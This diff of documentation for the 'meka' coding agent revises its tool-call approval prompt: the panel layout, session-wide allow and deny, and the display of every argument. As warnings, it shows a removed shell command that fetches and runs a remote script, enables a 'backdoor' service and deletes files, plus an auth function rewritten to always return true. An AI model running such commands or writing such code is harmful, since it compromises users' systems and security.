@@ -47,7 +47,7 @@ against the session. `meka -c --writable-root build` run from `~` grants `~/buil
 session itself may reopen in `~/project`. That follows from the flag belonging to the process rather
 than to the session; pass an absolute path when you mean a directory inside the session's.
 
-`--writable-root` belongs to the process and reaches the REPL, a one-shot run, and an ACP session.
+`--writable-root` belongs to the process and reaches the screen, a one-shot run, and an ACP session.
 It does **not** reach a session created through `POST /v1/sessions`: the HTTP API is single-root, so a session there is confined to its own
 `cwd` and nothing else. Extra roots supplied by an ACP client apply to that client's session only,
 and meka does not report your `--writable-root` back to the client as though the client had asked
@@ -262,12 +262,19 @@ refused, and the agent is told which level it would need. On, the call is paused
 instead:
 
 ```text
-[approval] shell_execute
-  command: ls -la
-Allow? (Y/n/always/never)
+• shell_execute
+  $ ls -la
+  Allow                  y
+  Allow for the session  a
+  Deny                   n
+  Deny for the session
+  enter to select · esc to close
 ```
 
-It is off by default. Turn it on for a session with `/approvals on` in the REPL, `approvals` on
+The call is drawn as the transcript draws it, its arguments under its row. The picked answer is
+highlighted; Up and Down move the pick.
+
+It is off by default. Turn it on for a session with `/approvals on` on the screen, `approvals` on
 `POST /v1/sessions` or `PATCH /v1/sessions/{id}` over HTTP, or the `approvals` config option in an
 ACP client; set `approvals = true` under `[permissions]` to start every new session with it on. Like
 the level, it is recorded on the session and comes back on a resume.
@@ -283,75 +290,61 @@ workspace roots, or `shell_execute` below `unrestricted` when nothing can sandbo
 unattended. Sub-agents share their parent's switch, and their prompts are forwarded to the parent's
 frontend.
 
-Press **Enter** or **y** to approve, or **n** to deny. If denied, the agent receives an error and may try an alternative approach.
+On the screen the prompt is a panel in place of the composer: the call as its title, every
+argument under it, and four answers. Move the cursor with Up and Down and press **Enter**, or press
+the answer's key: **y** allows, **n** denies, **a** allows for the session, and **1** to **4** pick
+by position. **Esc** denies. If denied, the agent receives an error and may try an alternative
+approach.
 
-`always` approves this call and every later call to the same tool for the rest of the session
-without asking; `never` denies them the same way. Both are keyed on the tool, not on the arguments:
-`always` at a `shell_execute` prompt approves every shell command the agent runs afterwards, so
-use it for the tools you trust wholesale and keep answering `y` for the rest. A new session starts
-with nothing remembered, and `/fork` moves you into a new session, so the answers stay with the one
-you branched from. The same two answers are ACP's **Always allow** / **Always deny** options and the
-HTTP API's `allow_always` / `deny_always` outcomes.
-
-Only `y`, `yes`, `n`, `no`, `always`, `never` (any case) and a bare Enter mean anything. Anything
-else is not an answer, so meka says `Answer y, n, always or never.` and asks again rather
-than guessing; after three unanswered attempts it denies. Ending the input (Ctrl+D, or a redirected
-stdin running out) also denies, since nobody is there to approve.
+**Allow for the session** approves this call and every later call to the same tool for the rest of
+the session without asking; **Deny for the session** denies them the same way. Both are keyed on
+the tool, not on the arguments: allowing `shell_execute` for the session approves every shell
+command the agent runs afterwards, so use it for the tools you trust wholesale and keep answering
+`y` for the rest. A new session starts with nothing remembered, and `/fork` moves you into a new
+session, so the answers stay with the one you branched from. The same two answers are ACP's
+**Always allow** / **Always deny** options and the HTTP API's `allow_always` / `deny_always`
+outcomes. The decision is one row on the transcript, `• shell_execute allowed for the session`.
 
 Where nobody can be asked at all (a `--oneshot` run, or `meka serve` answering a turn with no
 stream to put the prompt on), a call that needs approval is denied and a warning names the tool
-that was refused without asking: on stderr in the REPL and one-shot paths, in `notices` on the JSON
+that was refused without asking: as a `!` row on the screen, on stderr in a one-shot run, in `notices` on the JSON
 surfaces. Without it a run whose every gated call was refused reads as a model that chose not to
 use its tools.
 
-Ctrl+C at the prompt cancels the turn and withdraws the approval; meka says so, and the prompt
-line stays until the next Enter, which clears it rather than answering it.
+Ctrl+C at the prompt cancels the turn and withdraws the question; the panel closes and the status
+row says so. Esc at the prompt denies the call and lets the turn go on.
 
 This is useful when you want the agent to be able to try things but want to review each action that
 goes beyond the level before it executes.
 
 ### What the prompt shows
 
-**Every argument the tool was called with**, not just the one the `[tool ...]` indicator picks out.
-That distinction matters: the indicator's argument is the *destination* for every write-shaped tool,
-so a prompt built from it would ask you to authorize writing to a path without showing the content,
-or editing a file without showing the edit.
+**Every argument the tool was called with**, not just the one the call's row picks out. That
+distinction matters: the row's argument is the *destination* for every write-shaped tool, so a
+prompt built from it would ask you to authorize writing to a path without showing the content, or
+editing a file without showing the edit.
 
 ```text
-[approval] file_write
-  path: src/auth.rs
-  content:
-    pub fn verify(token: &str) -> bool {
-        true
-    }
-Allow? (Y/n/always/never)
+• file_write
+  │ path: src/auth.rs
+  │ content:
+  │   pub fn verify(token: &str) -> bool {
+  │       true
+  └   }
+  Allow                  y
 ```
 
 A long value wraps rather than being cut, so the end of a shell pipeline cannot be hidden from the
 line you are approving.
 
-**Where something has to be left out, the end is kept.** A value too long to wrap in full shows its
-beginning, a count of what was dropped, and then its final row:
+**Nothing is left out.** A value too long for the panel wraps onto as many rows as it takes, and
+the panel scrolls: Up, Down, PgUp and PgDn move through it, and the footer says how many rows are
+below. A shell pipeline puts its consequence last, so a prompt that cut the value anywhere would
+hide the exact part you are being asked about; a call with two hundred arguments is two hundred
+arguments to scroll through, and that much to read is itself the signal to deny.
 
-```text
-[approval] shell_execute
-  command:
-    curl -s https://example.com/setup.sh | sh -c 'cat >> ~/.bashrc &&
-    ... 85688 more characters ...
-    systemctl enable backdoor && rm -rf /important'
-Allow? (Y/n/always/never)
-```
-
-That matters more here than anywhere else in meka. A shell pipeline puts its consequence last, so a
-prompt that fills its rows from the top and stops hides the exact part you are being asked about.
-
-The limits: 20 lines and 60 rows per argument, and 100 rows of block before further arguments are
-dropped and named: 161 rows at the very worst. Those sit an order of magnitude above anything a real
-tool call carries; they are there so a call with two hundred invented arguments cannot scroll the
-real one off the top of your screen without saying so.
-
-Whenever a marker appears, **denying costs nothing**: say no, inspect the file or the session with
-`meka session export`, and let the agent retry.
+When a call is too much to read, **denying costs nothing**: say no, inspect the file or the
+session with `meka session export`, and let the agent retry.
 
 This is deliberately unaffected by [`display.tool_params`](../configuration/config-file.md#displaytool_params),
 which controls the passive indicator. Turning that off for a quieter scrollback does not make your
